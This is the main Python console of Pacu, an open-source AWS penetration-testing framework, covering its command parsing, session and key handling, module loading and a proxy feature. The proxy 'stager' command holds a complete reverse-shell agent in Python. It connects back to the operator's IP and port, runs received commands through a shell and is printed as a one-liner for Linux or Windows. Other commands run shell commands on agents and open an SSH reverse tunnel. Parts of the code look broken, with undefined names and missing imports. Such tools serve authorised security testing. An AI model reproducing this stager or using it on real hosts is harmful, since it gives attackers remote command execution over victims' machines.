#!/usr/bin/env python3
import copy
import json
import os
import re
import requests
import subprocess
import sys
import time
import traceback

import configure_settings
import settings

from core.models import AWSKey, PacuSession
from pacu_proxy import PacuProxy
from setup_database import setup_database_if_not_present
from utils import get_database_connection, set_sigint_handler


def display_help():
    print("""
    Pacu - https://github.com/RhinoSecurityLabs/pacu
    Written and researched by Spencer Gietzen of Rhino Security Labs - https://rhinosecuritylabs.com/

    This was built as a modular, open source tool to assist in penetration testing an AWS environment.
    For usage and developer documentation, please visit the GitHub page.

    Modules that have pre-requisites will have those listed in that modules help info, but if it is
    executed before its pre-reqs have been filled, it will prompt you to run that module then continue
    once that is finished, so you have the necessary data for the module you want to run.

    Command info:
        list/ls                             List all modules
        search <search term>                Search the list of available modules by name
        help                                Display this page of information
        help <module name>                  Display information about a module
        whoami                              Display information regarding to the active access keys
        data                                Display all data that is stored in this session. Only fields
                                              with values will be displayed
        data <service>                      Display all data for a service in this session
        services                            Display a list of services that have collected data in the
                                              current session to use with the "data" command
        regions                             Display a list of all valid AWS regions
        set_regions <region> [<region>...]  Set the default regions for this session. These space-separated
                                              regions will be used for modules where regions are required,
                                              but not supplied by the user. The default set of regions is
                                              every supported region for the service. Supply "all" to this
                                              command to reset the region set to the default of all
                                              supported regions
        run/exec <module name>              Execute a module
        set_keys                            Add a set of AWS keys to the session and set them as the
                                              default
        swap_keys                           Change the currently active AWS key to another key that has
                                              previously been set for this session.
        exit/quit                           Exit Pacu
    """)


# These utility methods are placed in a class so they don't auto-override
# builtin functions in this file.
class util(object):

    def log_error(text, exception_info=None, session=None, local_data=None, global_data=None):
        """ Write an error to the file at log_file_path, or a default log file
        if no path is supplied. If a session is supplied, its name will be used
        to determine which session directory to add the error file to. """

        timestamp = time.strftime('%F %T', time.gmtime())

        if session:
            session_tag = f'({session.name})'
        else:
            session_tag = '<No Session>'

        try:
            if session:
                log_file_path = f'sessions/{session.name}/error_log.txt'
            else:
                log_file_path = 'global_error_log.txt'

            print(f'\n[{timestamp}] Pacu encountered an error while running the previous command. Check {log_file_path} for technical details. [LOG LEVEL: {settings.ERROR_LOG_VERBOSITY.upper()}]\n\n    {exception_info}\n')

            log_file_directory = os.path.dirname(log_file_path)
            if log_file_directory and not os.path.exists(log_file_directory):
                os.makedirs(log_file_directory)

            formatted_text = f'[{timestamp}] {session_tag}: {text}'

            if settings.ERROR_LOG_VERBOSITY.lower() in ('low', 'high', 'extreme'):
                if session:
                    session_data = session.get_all_fields_as_dict()
                    # Empty values are not valid keys, and that info should be
                    # preserved by checking for falsiness here.
                    if session_data.get('secret_access_key'):
                        session_data['secret_access_key'] = '****** (Censored)'

                    formatted_text += 'SESSION DATA:\n    {}\n'.format(
                        json.dumps(
                            session_data,
                            indent=4,
                            default=str
                        )
                    )

            if settings.ERROR_LOG_VERBOSITY.lower() == 'high':
                if local_data is not None and global_data is not None:
                    formatted_text += '\nLAST TWO FRAMES LOCALS DATA:\n    {}\n'.format('\n\n    '.join(local_data[:2]))
                    formatted_text += '\nLAST TWO FRAMES GLOBALS DATA:\n    {}\n'.format('\n\n    '.join(global_data[:2]))

            elif settings.ERROR_LOG_VERBOSITY.lower() == 'extreme':
                if local_data is not None and global_data is not None:
                    formatted_text += '\nALL LOCALS DATA:\n    {}\n'.format('\n\n    '.join(local_data))
                    formatted_text += '\nALL GLOBALS DATA:\n    {}\n'.format('\n\n    '.join(global_data))

            formatted_text += '\n'

            with open(log_file_path, 'a+') as log_file:
                log_file.write(formatted_text)

        except Exception as error:
            print('Error while saving exception information. This means the exception was not added to any error log and should most likely be provided to the developers.\n    Exception raised: {}'.format(str(error)))
            raise

    # @message: String - message to print and/or write to file
    # @module: String - name of the log file that is being written to
    # @output: String - where to output the message: both, file, or screen
    # @output_type: String - format for message when written to file: plain or xml
    # @is_cmd: boolean - Is the log the initial command that was run (True) or output (False)? Devs won't touch this most likely
    def print(message, database, module='cmd_log', output='both', output_type='plain', is_cmd=False, session_name=''):
        session = PacuSession.get_active_session(database)

        if session_name == '':
            session_name = session.name
        # Indent output from a command
        if is_cmd is False:
            # Add some recursion here to go through the entire dict for
            # 'SecretAccessKey'. This is to not print the full secret access
            # key into the logs, although this should get most cases currently.
            if type(message) is dict:
                if 'SecretAccessKey' in message:
                    message = copy.deepcopy(message)
                    message['SecretAccessKey'] = '{}{}'.format(message['SecretAccessKey'][0:int(len(message['SecretAccessKey']) / 2)], '*' * int(len(message['SecretAccessKey']) / 2))
                message = json.dumps(message, indent=2, default=str)
            else:
                message = '  {}'.format(message)
        if output == 'both' or output == 'file':
            if output_type == 'plain':
                with open('sessions/{}/{}.txt'.format(session_name, module), 'a+') as text_file:
                    text_file.write('{}\n'.format(message))
            elif output_type == 'xml':
                # TODO: Implement actual XML output
                with open('sessions/{}/{}.xml'.format(session_name, module), 'a+') as xml_file:
                    xml_file.write('{}\n'.format(message))
                pass
            else:
                print('  Unrecognized output type: {}'.format(output_type))
        if output == 'both' or output == 'screen':
            print(message)
        return True

    # @message: String - input question to ask and/or write to file
    # @module: String - name of the log file that is being written to
    # @output: String - where to output the message: both or screen (can't write a question to a file only)
    # @output_type: String - format for message when written to file: plain or xml
    def input(message, database, module='cmd_log', output='both', output_type='plain', session_name=''):
        session = PacuSession.get_active_session(database)

        if session_name == '':
            session_name = session.name

        message = '  {}'.format(message)
        res = input(message)
        if output == 'both':
            if output_type == 'plain':
                with open('sessions/{}/{}.txt'.format(session_name, module), 'a+') as file:
                    file.write('{} {}\n'.format(message, res))
            elif output_type == 'xml':
                # TODO: Implement actual XML output
                # now = time.time()
                with open('sessions/{}/{}.xml'.format(session_name, module), 'a+') as file:
                    file.write('{} {}\n'.format(message, res))\

            else:
                print('  Unrecognized output type: {}'.format(output_type))
        return res

    def validate_region(region, database):
        if region in util.get_regions('All', database):
            return True
        return False

    def get_regions(service, database):
        session = PacuSession.get_active_session(database)

        with open('./modules/service_regions.json', 'r+') as regions_file:
            regions = json.load(regions_file)

        # TODO: Add an option for GovCloud regions
        if str.lower(service) == 'all':
            return regions['All']
        if 'all' in session.session_regions or regions[service] == [None]:
            return regions[service]
        else:
            valid_regions = regions[service]
            return [region for region in valid_regions if region in session.session_regions]

        # # Programmatic way to do it, but much slower
        # ses = boto3.Session(
        #    aws_access_key_id='none',
        #    aws_secret_access_key='none'
        # )
        # # TODO: Add an option for GovCloud regions
        # regions = ses.get_available_regions(str.lower(service), 'aws')

        if 'all' in session.session_regions:
            return regions
        else:
            return [region for region in valid_regions if region in session.session_regions]

    # @database: sqlalchemy Session
    # @data: list
    # @module: string
    # @args: string
    def fetch_data(data, module, args, database, force=False):
        session = PacuSession.get_active_session(database)

        if data is None:
            current = None
        else:
            current = getattr(session, data[0], None)
            for item in data[1:]:
                if current is not None and item in current:
                    current = current[item]
                else:
                    current = None
                    break

        if current is None or current == '' or current == [] or current == {} or current is False:
            if force is False:
                run_prereq = util.input('The required data ({}) has not been found in this session, do you want to run the module "{}" to fetch that data? If not, re-run this module with the correct argument(s) specifying the values for this data. (y/n) '.format(' > '.join(data), module), database, session_name=session.name)
            else:
                run_prereq = 'y'
            if run_prereq == 'n':
                return False

            if args:
                exec_module(['exec', module, args], database)
            else:
                exec_module(['exec', module], database)
        return True

    def key_info(database, alias=''):
        """ Return the set of information stored specifically to the active key
        pair, as a dictionary. """
        session = PacuSession.get_active_session(database)

        if alias == '':
            alias = session.key_alias

        aws_key = database.query(AWSKey).filter(AWSKey.key_alias == alias).scalar()
        if aws_key is not None:
            return aws_key.get_fields_as_camel_case_dictionary()
        else:
            return False

    def install_dependencies(external_dependencies, database):
        if len(external_dependencies) < 1:
            return True
        answer = util.input('This module requires the external dependencies listed here: {}\n\nWould you like to install them now? (y/n) '.format(external_dependencies), database)
        if answer == 'n':
            util.print('Not installing dependencies, exiting...', database)
            return False
        util.print('\nInstalling {} total dependencies...'.format(len(external_dependencies)), database)
        for dependency in external_dependencies:
            split = dependency.split('/')
            name = split[-1]
            if name.split('.')[-1] == 'git':
                name = name.split('.')[0]
                author = split[-2]
                if os.path.exists('./dependencies/{}/{}'.format(author, name)):
                    util.print('  Dependency {}/{} is already installed.'.format(author, name), database)
                else:
                    try:
                        util.print('  Installing dependency {}/{} from {}...'.format(author, name, dependency), database)
                        subprocess.run(['git', 'clone', dependency, './dependencies/{}/{}'.format(author, name)])
                    except Exception as e:
                        util.print('    {} has failed, view the error below. If you are unsure, some potential causes are that you are missing "git" on your command line, your git credentials are not properly set or the GitHub link does not exist.'.format(e.cmd), database)
                        util.print('    Output from the command: {}\nstderr from the command: {}'.format(e.cmd, e.stderr), database)
                        util.print('  Exiting module...', database)
                        return False
            else:
                if os.path.exists('./dependencies/{}'.format(name)):
                    util.print('  Dependency {} is already installed.'.format(name), database)
                else:
                    try:
                        util.print('  Installing dependency {}...'.format(name), database)
                        r = requests.get(dependency, stream=True)
                        if r.status_code == 404:
                            raise Exception('File not found.')
                        with open('./dependencies/{}'.format(name), 'wb') as f:
                            for chunk in r.iter_content(chunk_size=1024):
                                if chunk:
                                    f.write(chunk)
                    except Exception as e:
                        util.print('    Downloading {} has failed, view the error below.'.format(dependency), database)
                        util.print(e, database)
                        util.print('  Exiting module...', database)

                        return False
        util.print('Dependencies have finished installing.', database)
        return True

    def get_active_session(database):
        """ A wrapper for PacuSession.get_active_session, removing the need to
        import the PacuSession model. """
        return PacuSession.get_active_session(database)

    def get_aws_key_by_alias(alias, database):
        """ Return an AWSKey with the supplied alias from the database, or
        None if no AWSKey with the supplied alias exists. If more than one key
        with the alias exists, an exception will be raised. """
        return database.query(AWSKey).filter(AWSKey.key_alias == alias).scalar()

def start_proxy(database):
    create_workers(database)
    create_jobs()
    return

# Create the proxy threads
def create_workers(database):
    server.prepare_server(database)
    for _ in range(2):
        t = threading.Thread(target=work, args=(database,), daemon=True)
        t.daemon = True
        t.start()
    return

# Handle the next job in queue (one thread handles connections, other sends commands)
def work(database):
    server = global_config['Proxy']
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 5:
            break # Shutdown listener called
    queue.task_done()
    return

# Fill the queue with jobs
def create_jobs():
    for x in [1, 2]: # Job numbers
        queue.put(x)
    return


def get_ssh_user(ssh_user, database):
    if ssh_user is None or 'UserName' not in ssh_user or ssh_user['UserName'] is None or ssh_user['UserName'] == '':
        new_user = util.input('No SSH user found to create the reverse connection back from the target agent. An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ', database)

        if new_user == 'y':
            # Create a random username that is randomly 3-9 characters
            username = ''.join(random.choices(string.ascii_lowercase, k=int(''.join(random.choices('3456789', k=1)))))
            command = 'adduser --shell /bin/false --disabled-password {}'.format(username)
            util.print('Running command: {}'.format(command))
            try:
                subprocess.run(command.split(' '), shell=True)
                try:
                    user_id = subprocess.check_output('id -u {}'.format(username), shell=True)
                    if 'no such user' in user_id:
                        util.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
                        return None
                    util.print('User {} created successfully!', database)
                    return {'UserName': username}
                except Exception as e:
                    util.print('Failed to find user after creation. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
                    return None
            except:
                util.print('Failed to create user...', database)
                return None
        else:
            return None
    else:
        try:
            user_id = subprocess.check_output('id -u {}'.format(ssh_user['UserName']), shell=True)
            if 'no such user' in user_id:
                util.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
                new_user = util.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
                if new_user == 'y':
                    return get_ssh_user(None, database)
                else:
                    return None
            else:
                return ssh_user
        except Exception as e:
            util.print('Failed to find a valid SSH user. Here is the output from the command "id -u {}": {}'.format(user_id, user_id), database)
            new_user = util.input('An SSH user on the PacuProxy server is required to create a valid socks proxy routing through the remote agent. The user will be created with password login disabled and a /bin/false shell. Do you want to generate that user now? (y/n) ')
            if new_user == 'y':
                return get_ssh_user(None, database)
            else:
                return None


def parse_command(command, database):
    session = PacuSession.get_active_session(database)

    command = command.strip()
    command = command.split(' ')

    if command[0] == '':
        return
    elif cmd[0] == 'proxy':
        proxy_data = copy.deepcopy(session.Proxy)
        if len(cmd) == 1: # Display proxy help
            print("""
    PacuProxy command info:
        proxy                               Control PacuProxy/display help
            start ip [port]                   Start the PacuProxy listener - port 80 by default
            stop                                Stop the PacuProxy listener
            kill <agent_id>                     Kill an agent (stop it from running on the host)
            list/ls                             List info on remote agent(s)
            use none|<agent_id>                 Use a remote agent, identified by unique integers 
                                                  (use "proxy list" to see them). Choose "none" to
                                                  no longer use any proxy (route from the local
                                                  host instead)
            shell <agent_id> <command>          Run a shell command on the remote agent
            stager lin|win                      Generate a PacuProxy stager. The two formats available
                                                  are python one-liners for Linux (lin) or Windows
                                                  (win). The only difference in the payloads is how
                                                  command-line escaping is done for valid syntax.
""")
        elif cmd[1] == 'start': # Start proxy server
            if global_config['Proxy'] is None:
                if len(cmd) == 4:
                    proxy_data['Port'] = cmd[3]
                else:
                    proxy_data['Port'] = 80
                proxy_data['IP'] = cmd[2]
                print('Starting PacuProxy on {}:{}...'.format(proxy_data['IP'], proxy_data['Port']))
                start_proxy(database)
                session.update(database, Proxy=proxy_data)
                return
            else:
                print('There already seems to be a listener running: {}'.format(global_config['Proxy']))
        elif cmd[1] == 'list' or cmd[1] == 'ls': # List active agent connections
            global_config['Proxy'].list_connections(database)
        elif cmd[1] == 'shell' and len(cmd) > 3: # Run shell command on an agent  
            global_config['Proxy'].run_cmd(int(cmd[2]), global_config['Proxy'].all_connections[int(cmd[2])], ' '.join(cmd[3:]))
        elif cmd[1] == 'stop': # Stop proxy server
            if global_config['Proxy'] is None:
                print('There does not seem to be a listener running currently.')
            else:
                global_config['Proxy'].quit_gracefully(database)
                queue.put(5)
                global_config['Proxy'] = proxy_data['Target'] = proxy_data['IP'] = None
        elif cmd[1] == 'kill': # Kill an agent connection
            if len(cmd) == 3:
                print('** Killing agent {}... **'.format(int(cmd[2])))
                global_config['Proxy'].quit(int(cmd[2]), global_config['Proxy'].all_connections[int(cmd[2])])
                print('** Agent killed **')
            elif len(cmd) == 2:
                print(' ** Incorrect input, excepted an agent ID, received nothing. Use format: proxy kill <agent_id> **')
            else:
                print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
        elif cmd[1] == 'stager':
            if len(cmd) == 3:
                python_stager = "import os,socket as E,subprocess as B,time as t,sys,struct as D\\nclass A(object):\\n  def __init__(self):\\n    self.S='{}'\\n    self.p={}\\n    self.s=None\\n  def b(self):\\n    try:\\n      self.s=E.socket()\\n    except:\\n      pass\\n    return\\n  def c(self):\\n    try:\\n      self.s.connect((self.S,self.p))\\n    except:\\n      t.sleep(5)\\n      raise\\n    try:\\n      self.s.send(E.gethostname().encode('ascii'))\\n    except:\\n      pass\\n    return\\n  def d(self,R):\\n    Q=R.encode('ascii')\\n    self.s.send(D.pack('>I',len(Q))+Q)\\n    return\\n  def e(self):\\n    try:\\n      self.s.recv(10)\\n    except:\\n      return\\n    self.s.send(D.pack('>I',0))\\n    while True:\\n      R=None\\n      U=self.s.recv(20480)\\n      if U==b'': break\\n      elif U[:2].decode('utf-8')=='cd':\\n        P=U[3:].decode('utf-8')\\n        try:\\n          os.chdir(P.strip())\\n        except Exception as e:\\n          R='Err: %s\\\n'%str(e)\\n        else:\\n          R=''\\n      elif U[:].decode('utf-8')=='q':\\n        self.s.close()\\n        sys.exit(0)\\n      elif len(U)>0:\\n        try:\\n          T=B.Popen(U[:].decode('utf-8'),shell=True,stdout=B.PIPE,stderr=B.PIPE,stdin=B.PIPE)\\n          M=T.stdout.read()+T.stderr.read()\\n          R=M.decode('utf-8',errors='replace')\\n        except Exception as e:\\n          R='Err:%s\\\n'%str(e)\\n      if R is not None:\\n        try:\\n          self.d(R)\\n        except:\\n          pass\\n    self.s.close()\\n    return\\ndef f():\\n  C=A()\\n  C.b()\\n  while True:\\n    try:\\n      C.c()\\n    except Exception as e:\\n      t.sleep(5)\\n    else:\\n      break\\n  try:\\n    C.e()\\n  except:\\n    pass\\n  C.s.close()\\n  return\\nsys.stderr=object\\nwhile True:\\n  f()".format(proxy_data['IP'], proxy_data['Port'])
                if cmd[2] == 'lin': # Linux one-liner (uses \" to escape inline double-quotes)
                    print('python3 -c "{}"'.format("exec(\\\"\\\"\\\"{}\\\"\\\"\\\")".format(python_stager)))
                elif cmd[2] == 'win': # Windows one-liner (uses `" to escape inline double-quotes)
                    print('python3 -c "{}"'.format("exec(`\"`\"`\"{}`\"`\"`\")".format(python_stager)))
                else:
                    print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]))
            else:
                print('** Incorrect input, expected target operating system ("win" or "lin"), received: {}'.format(cmd[2:]))
        elif cmd[1] == 'use':
            if len(cmd) == 3:
                try:
                    if cmd[2] == 'none':
                        print('No longer using a remote PacuProxy agent to route commands...')
                        proxy_data['Target'] = None
                    else:
                        print('Setting proxy target to agent {}...'.format(cmd[2]))

                        proxy_data['SSHUser'] = get_ssh_user(proxy_data['SSHUser'], database)
                        if proxy_data['SSHUser'] is None:
                            util.print('No SSH user on the local PacuProxy server, not routing traffic through the target agent.')
                            session.update(database, Proxy=proxy_data)
                            return

                        proxy_data['Target'] = int(cmd[2])
                        connect_back_cmd = 'ssh -R 443 {}@{}'.format(proxy_data['SSHUser']['UserName'], proxy_data['IP'])
                        global_config['Proxy'].run_cmd(proxy_data['Target'], global_config['Proxy'].all_connections[int(cmd[2])], connect_back_cmd)
                except:
                    print('** Invalid agent ID, expected an integer or "none", received: {}'.format(cmd[2]))
            else:
                print('** Incorrect input, excepted an agent ID, received: {}'.format(cmd[2:]))
        session.update(database, Proxy=proxy_data)
    elif (command[0] == 'run' or command[0] == 'exec') and len(command) > 1:
        exec_module(command, database)
    elif command[0] == 'list' or command[0] == 'ls':
        list_modules('', database)
    elif command[0] == 'search' and len(command) > 1:
        list_modules(command[1], database)
    elif command[0] == 'set_keys':
        set_keys(database)
    elif command[0] == 'swap_keys':
        swap_keys(database)
    elif command[0] == 'exit' or command[0] == 'quit':
        sys.exit('SIGINT called')
    elif command[0] == 'help' and len(command) > 1:
        display_module_help(command[1])
    elif command[0] == 'help':
        display_help()
    elif command[0] == 'whoami':
        print(json.dumps(util.key_info(database), indent=2, default=str))
    elif command[0] == 'data':
        if len(command) == 1:
            session.print_all_data_in_session()
        else:
            if command[1] not in session.aws_data_field_names:
                print('  Service not found.')
            elif getattr(session, command[1]) == {} or getattr(session, command[1]) == [] or getattr(session, command[1]) == '':
                print('  No data has been collected yet for the specified service.')
            else:
                print(json.dumps(getattr(session, command[1]), indent=2, sort_keys=True, default=str))
    elif command[0] == 'set_regions' and len(command) > 1:
        for region in command[1:]:
            if region.lower() == 'all':
                session.update(database, session_regions=['all'])
                print('  The region set for this session has been reset to the default of all supported regions.')
                return
            if util.validate_region(region, database) is False:
                print('  {} is not a valid region.\n  Session regions not changed.'.format(region))
                return
        session.update(database, session_regions=command[1:])
        print('  The region set for this session has been changed: {}'.format(session.session_regions))
    elif command[0] == 'services':
        services = session.get_all_aws_data_fields_as_dict()
        for service in services.keys():
            print('  {}'.format(service))
    elif command[0] == 'regions':
        for region in sorted(util.get_regions('All', database)):
            print('  {}'.format(region))
    else:
        print('  Error: Unrecognized command')
    return


def import_module_by_name(module_name, include=()):
    module = None

    for root, categories, files in os.walk('{}/modules'.format(os.getcwd())):
        modules_directory_path = os.path.realpath('{}/modules'.format(os.getcwd()))
        category_path = os.path.realpath(root)

        # Skip any directories inside modules.
        if not category_path.startswith(modules_directory_path):
            continue

        # Skip the root directory.
        elif modules_directory_path == category_path:
            continue

        category = os.path.basename(root)

        for file in files:
            if file.endswith(".py") and module_name == file[:-3]:
                # Make sure the format is correct
                module_path = 'modules/{}/{}'.format(category, module_name).replace('/', '.').replace('\\', '.')

                # Import the help function from the module
                module = __import__(module_path, globals(), locals(), include, 0)

    return module


###### Some module notes
# For any argument that needs a value and a region for that value, use the form
# value@region
# Arguments that accept multiple values should be comma separated.
######
def exec_module(command, database):
    session = PacuSession.get_active_session(database)

    # Run key checks so that if no keys have been set, Pacu doesn't default to
    # the AWSCLI default profile:
    if not session.access_key_id:
        print('  No access key has been set. Not running module.')
        return
    if not session.secret_access_key:
        print('  No secret key has been set. Not running module.')
        return

    module_name = command[1]
    module = import_module_by_name(module_name, include=['main', 'help'])

    if module is not None:
        # Plaintext Command Log
        util.print('{} ({}): {}'.format(session.access_key_id, time.strftime("%a, %d %b %Y %H:%M:%S", time.gmtime()), ' '.join(command).strip()), database, output='file', is_cmd=True)

        ## XML Command Log - Figure out how to auto convert to XML
        # util.print('<command>{}</command>'.format(cmd), database, output_type='xml', output='file')

        util.print('  Running module {}...'.format(module_name), database)
        util.print('    {}\n'.format(module.help()[0]['description']), database)

        try:
            module.main(command[2:], database)
        except SystemExit as error:
            exception_type, exception_value, tb = sys.exc_info()
            if 'SIGINT called' in exception_value.args:
                util.print('^C\nExiting the currently running module.', database)
            else:
                traceback_text = '\nTraceback (most recent call last):\n{}{}: {}\n\n'.format(''.join(traceback.format_tb(tb)), str(exception_type), str(exception_value))
                session, global_data, local_data = get_data_from_traceback(tb)
                util.log_error(
                    traceback_text,
                    exception_info=f'{exception_type}: {exception_value}\n\nPacu caught a SystemExit error. This may be due to incorrect module arguments received by argparse in the module itself. Check to see if any required arguments are not being received by the module when it executes.',
                    session=session,
                    local_data=local_data,
                    global_data=global_data
                )
        return

    else:
        print('Module not found. Is it spelled correctly? Try using the module search function.')
        return


def display_module_help(module_name):
    module = import_module_by_name(module_name, include=['help'])

    if module is not None:
        help = module.help()

        print('\n{} written by {}.\n'.format(help[0]['name'], help[0]['author']))

        if 'prerequisite_modules' in help[0] and len(help[0]['prerequisite_modules']) > 0:
            print('Prerequisite Module(s): {}\n'.format(help[0]['prerequisite_modules']))

        if 'external_dependencies' in help[0] and len(help[0]['external_dependencies']) > 0:
            print('External dependencies: {}\n'.format(help[0]['external_dependencies']))

        print(help[1].replace(os.path.basename(__file__), 'exec {}'.format(help[0]['name']), 1))

        return

    else:
        print('Module not found. Is it spelled correctly? Try using the module search function.')


def initialize_tab_completion():
    try:
        import readline
        # Big thanks to samplebias: https://stackoverflow.com/a/5638688
        COMMANDS = ['run', 'exec', 'list', 'ls', 'whoami', 'search', 'services', 'regions', 'set_regions', 'data', 'set_keys', 'swap_keys', 'help', 'exit', 'quit']
        MODULES = []
        for root, dirs, files in os.walk('{}/modules'.format(os.getcwd())):
                    for file in files:
                        if file.endswith(".py") and '__init__' not in file and 'template.py' not in file:
                            MODULES.append(file[:-3])
        RE_SPACE = re.compile('.*\s+$', re.M)
        readline.set_completer_delims(' \t\n`~!@#$%^&*()=+[{]}\\|;:\'",<>/?')

        class Completer(object):
            def complete(self, text, state):
                buffer = readline.get_line_buffer()
                line = readline.get_line_buffer().split()
                # If nothing has been typed, show all commands. If help, exec, or run has been typed, show all modules
                if not line:
                    return [c + ' ' for c in COMMANDS][state]
                if len(line) == 1 and (line[0] == 'help' or line[0] == 'exec' or line[0] == 'run'):
                    return [c + ' ' for c in MODULES][state]
                # account for last argument ending in a space
                if RE_SPACE.match(buffer):
                    line.append('')
                # Resolve command to the implementation function
                if len(line) == 1:
                    cmd = line[0].strip()
                    results = [c + ' ' for c in COMMANDS if c.startswith(cmd)] + [None]
                elif len(line) == 2:
                    cmd = line[1].strip()
                    results = [c + ' ' for c in MODULES if c.startswith(cmd)] + [None]
                elif len(line) >= 3:
                    if line[0].strip() == 'run' or line[0].strip() == 'exec':
                        module_name = line[1].strip()
                        module = import_module_by_name(module_name, include=['module_info'])
                        autocomplete_arguments = module.module_info.get('arguments_to_autocomplete', list())
                        current_argument = line[-1].strip()
                        results = [c + ' ' for c in autocomplete_arguments if c.startswith(current_argument)] + [None]
                return results[state]

        comp = Completer()
        readline.parse_and_bind("tab: complete")
        readline.set_completer(comp.complete)
    except Exception as e:
        # Error means most likely on Windows where readline is not supported
        # TODO: Implement tab-completion for Windows
        # print(e)
        pass


def idle(database):
    session = PacuSession.get_active_session(database)

    if session.key_alias:
        alias = session.key_alias
    else:
        alias = 'No Keys Set'

    command = input('Pacu ({}:{}) > '.format(session.name, alias))

    parse_command(command, database)

    idle(database)


def list_modules(search_term, database):
    for root, dirs, files in os.walk('{}/modules'.format(os.getcwd())):
        for category in dirs:
            # To avoid name collision
            for root2, dirs2, files2 in os.walk('{}/modules/{}'.format(os.getcwd(), category)):
                for file in files2:
                    if file.endswith(".py") and search_term in file and '__init__' not in file and 'template.py' not in file:
                        regions = []
                        # Make sure the format is correct
                        module = 'modules/{}/{}'.format(category, file[:-3]).replace('/', '.').replace('\\', '.')
                        # Import the help function from the module
                        module = __import__(module, globals(), locals(), ['help'], 0)
                        services = module.help()[0]['services']
                        for service in services:
                            regions += util.get_regions(service, database)
                        if len(regions) > 0:
                            print('  {}'.format(file[:-3]))
                            if search_term is not None and not search_term == '':
                                print('    {}\n'.format(module.help()[0]['one_liner']))


def set_keys(database):
    session = PacuSession.get_active_session(database)

    util.print('Setting AWS Keys. Press enter to keep the value currently stored. Enter the letter C to clear the value, rather than set it. If you enter an existing key_alias, that key\'s fields will be updated with the information provided.', database)

    # Key alias
    new_value = util.input(f'Key alias [{session.key_alias}]: ', database)
    if str(new_value.strip().lower()) == 'c':
        session.key_alias = None
    elif str(new_value) != '':
        session.key_alias = new_value

    # Access key ID
    new_value = util.input(f'Access key ID [{session.access_key_id}]: ', database)
    if str(new_value.strip().lower()) == 'c':
        session.access_key_id = None
    elif str(new_value) != '':
        session.access_key_id = new_value

    # Secret access key (should not be entered in log files)
    new_value = input(f'  Secret access key [{session.secret_access_key}]: ')
    util.print('Secret access key [******]: ****** (Censored)', database, output='file')
    if str(new_value.strip().lower()) == 'c':
        session.secret_access_key = None
    elif str(new_value) != '':
        session.secret_access_key = new_value

    # Session token (optional)
    new_value = util.input(f'Session token (Optional - for temp AWS keys only) [{session.session_token}]: ', database)
    if str(new_value.strip().lower()) == 'c':
        session.session_token = None
    elif str(new_value) != '':
        session.session_token = new_value

    database.add(session)

    aws_key = session.get_active_aws_key(database)
    if aws_key:
        aws_key.key_alias = session.key_alias
        aws_key.access_key_id = session.access_key_id
        aws_key.secret_access_key = session.secret_access_key
        aws_key.session_token = session.session_token
    else:
        aws_key = AWSKey(
            session=session,
            key_alias=session.key_alias,
            access_key_id=session.access_key_id,
            secret_access_key=session.secret_access_key,
            session_token=session.session_token
        )
    database.add(aws_key)

    database.commit()
    util.print('Configuration variables have been set.', database)


def swap_keys(database):
    session = PacuSession.get_active_session(database)
    aws_keys = session.aws_keys.all()

    if not aws_keys:
        util.print('\nNo AWS keys have been set for this session. Use set_keys to add AWS keys.\n', database)
        return

    util.print('\nSwapping AWS Keys. Press enter to keep the currently active key.', database)

    print('AWS keys associated with this session:')

    for index, aws_key in enumerate(aws_keys, 1):
        if aws_key.key_alias == session.key_alias:
            print(f'  [{index}] {aws_key.key_alias} (ACTIVE)')
        else:
            print(f'  [{index}] {aws_key.key_alias}')

    choice = input('Choose an option: ')

    if not str(choice).strip():
        util.print(f'The currently active AWS key will remain active. ({session.key_alias})', database)
        return

    if not choice.isdigit() or int(choice) not in range(1, len(aws_keys) + 1):
        print(f'Please choose a number from 1 to {len(aws_keys)}.')
        return swap_keys(database)

    chosen_key = aws_keys[int(choice) - 1]
    session.key_alias = chosen_key.key_alias
    session.access_key_id = chosen_key.access_key_id
    session.secret_access_key = chosen_key.secret_access_key
    session.session_token = chosen_key.session_token
    database.add(session)
    database.commit()
    util.print(f'AWS key is now {session.key_alias}.', database)


def check_sessions(database):
    sessions = database.query(PacuSession).all()

    if not sessions:
        session = new_session(database)

    else:
        print('Found existing sessions:')
        print('  [0] New session')

        for index, session in enumerate(sessions, 1):
            print('  [{}] {}'.format(index, session.name))

        choice = input('Choose an option: ')

        try:
            if int(choice) == 0:
                session = new_session(database)
            else:
                session = sessions[int(choice) - 1]
        except (ValueError, IndexError):
            print('Please choose a number from 0 to {}.'.format(len(sessions)))
            return check_sessions(database)

    session.activate(database)


def new_session(database):
    session_data = dict()
    name = None

    while not name:
        name = input('What would you like to name this new session? ').strip()
        if not name:
            print('A session name is required.')
        else:
            existing_sessions = database.query(PacuSession).filter(PacuSession.name == name).all()
            if existing_sessions:
                print('A session with that name already exists.')
                name = None

    session_data['name'] = name

    session = PacuSession(**session_data)
    database.add(session)
    database.commit()

    session_downloads_directory = './sessions/{}/downloads/'.format(name)
    if not os.path.exists(session_downloads_directory):
        os.makedirs(session_downloads_directory)

    print('Session {} created.'.format(name))

    return session


def get_data_from_traceback(tb):
    session = None
    global_data_in_all_frames = list()
    local_data_in_all_frames = list()

    for frame, line_number in traceback.walk_tb(tb):
        global_data_in_all_frames.append(str(frame.f_globals))
        local_data_in_all_frames.append(str(frame.f_locals))

        # Save the most recent PacuSession called "session", working backwards.
        if session is None:
            session = frame.f_locals.get('session', None)
            if not isinstance(session, PacuSession):
                session = None

    return session, global_data_in_all_frames, local_data_in_all_frames


def main():
    idle_ready = False

    while True:
        try:
            if not idle_ready:
                print("""
                                                                                .,*(###((,.
                                                                           ,#&&&&&&&&&&&&&&&&&%*
                                                                         /&&&&&&&&&&&&&&&&&&&&&&&&.
                                                                      *&&&&&&&/.       .*(&&&&&&&&(
                                                                     %&&&&&&%,                (&&&&&&&/
                                                                   .%&&&&                     *&&&&&&*
                                                                  ,#(/**/*                        (&&&&&(
                                                                                                   /&&&&&%#%&&&&&&%#*
